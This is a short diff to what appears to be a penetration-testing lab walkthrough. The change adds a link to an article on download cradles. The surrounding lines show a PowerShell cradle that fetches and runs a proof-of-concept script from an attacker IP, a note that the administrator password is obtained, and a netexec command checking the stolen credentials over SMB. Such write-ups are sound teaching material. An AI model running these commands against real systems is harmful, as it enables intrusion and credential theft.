@@ -513,6 +513,8 @@ date = 2024-10-14
     -   `iex(new-object net.webclient).downloadstring('http://10.10.14.46:9000/AdConnectPOC.ps1')`
     -   {{< figure src="/ox-hugo/2024-10-14-131101_.png" >}}
     -   We get the administrators password.
+    -   +Deep Dive+: I have a deep dive into download cradles and how they work: 
+         -   https://bloodstiller.com/articles/understandingdownloadcradles/
 
 -   **I verify the password works using netexec**:
     -   `netexec smb $box -u $user -p $pass --shares`
